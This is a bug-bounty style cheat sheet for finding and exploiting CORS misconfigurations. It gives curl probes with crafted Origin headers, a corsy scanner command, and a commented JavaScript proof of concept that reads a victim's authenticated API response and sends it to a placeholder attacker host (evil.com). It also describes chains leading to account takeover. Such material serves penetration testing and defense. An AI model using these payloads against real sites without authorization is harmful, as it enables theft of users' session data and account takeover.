# CORS Techniques

> Cross-Origin Resource Sharing misconfiguration — server reflects attacker-controlled `Origin` in `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`, enabling cross-origin reads of authenticated responses.

## Surface

- `/api/` endpoints — especially those returning user data, tokens, or session info
- `/account/`, `/profile/`, `/me/` — authenticated data endpoints
- Any response with `Access-Control-Allow-Origin` header — check the value
- APIs consumed by mobile/SPA clients — often liberal CORS for dev convenience
- Internal admin APIs exposed to same-origin SPAs — may have overly broad policy
- GraphQL `/graphql` endpoint — single endpoint, entire data model exposed if CORS is misconfigured

## Test Approach

1. **Probe arbitrary origin reflection** — send `Origin: https://evil.com`, check if it's reflected in `ACAO`:
   ```
   curl -s -I -H "Origin: https://evil.com" https://target.com/api/user | grep -i "access-control"
   ```
2. **Check for credentials flag** — vuln only if both `ACAO: https://evil.com` AND `ACAC: true`
3. **Test null origin** — triggers on sandboxed iframes and `file://` loads:
   ```
   curl -s -I -H "Origin: null" https://target.com/api/user | grep -i "access-control"
   ```
4. **Test subdomain of target** — if regex allows `*.target.com`, a compromised subdomain is enough:
   ```
   curl -s -I -H "Origin: https://sub.target.com" https://target.com/api/user
   curl -s -I -H "Origin: https://notreallytarget.com" https://target.com/api/user
   ```
5. **Test prefix/suffix bypass** — regex `^https://target\.com` matched by `https://target.com.evil.com`; `\.target\.com$` matched by `https://evil.target.com`:
   ```
   curl -s -I -H "Origin: https://target.com.evil.com" https://target.com/api/user
   curl -s -I -H "Origin: https://evil.target.com" https://target.com/api/user
   ```
6. **Run corsy for automated sweep**:
   ```
   python3 corsy.py -u https://target.com/api/user -t 10 --headers "Cookie: session=<token>"
   ```
7. **Confirm exploitability** — if ACAO reflects and ACAC is true, write exploit PoC and verify authenticated data is readable cross-origin

## Tools

- **corsy** — automated CORS misconfiguration scanner; `python3 corsy.py -u https://target.com -t 10`
- **curl** — manual probe; quickest way to check a single endpoint with custom Origin header
- **Burp Suite** — set `Origin` header in Repeater; use Match/Replace to add Origin to all requests in scope

## Payloads / Probes

```bash
# Basic reflection check
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user
# Look for: Access-Control-Allow-Origin: https://evil.com
#           Access-Control-Allow-Credentials: true

# Null origin (sandboxed iframe exploit)
curl -s -I -H "Origin: null" https://target.com/api/user

# Subdomain prefix bypass (regex: target\.com$)
curl -s -I -H "Origin: https://evil.target.com" https://target.com/api/user

# Suffix bypass (regex: ^https://target\.com)
curl -s -I -H "Origin: https://target.com.evil.com" https://target.com/api/user

# Exploit PoC — paste in browser console or host as HTML
# <script>
# fetch('https://target.com/api/user', {credentials: 'include'})
#   .then(r => r.text())
#   .then(d => fetch('https://evil.com/?d=' + btoa(d)));
# </script>
```

## Chain Opportunities

- **CORS misconfiguration → ATO** — steal session token, API key, or CSRF token from authenticated `/api/` response; full account takeover without credential theft
- **CORS + XSS → exfil escalation** — XSS on any subdomain combined with credentialed CORS reads full authenticated API responses from main domain
- **CORS + null origin → sandboxed iframe attack** — if null origin allowed, host `<iframe sandbox>` on attacker page to make credentialed requests to target
- **CORS on internal API → pivot** — misconfigured internal API accessible from external SPA; attacker reads internal data cross-origin if they can reach the endpoint

## Recent Intel

- **CORS misconfig still top BB payout (2024-2025)** · Credentialed CORS reflection on `/api/` endpoints consistently rated P2/P3; highest payouts when chained to token endpoints
- **Null origin via `<iframe sandbox>`** · PortSwigger research · `<iframe sandbox="allow-scripts" src="data:text/html,...">` sets `Origin: null`; bypasses checks that only look for `file://` as null origin source
- **HackerOne 2025 report** · CORS misconfiguration ranked in top 10 by volume; regex-based origin allowlists (`endsWith`, `startsWith`) bypassed in majority of tested targets with prefix/suffix tricks
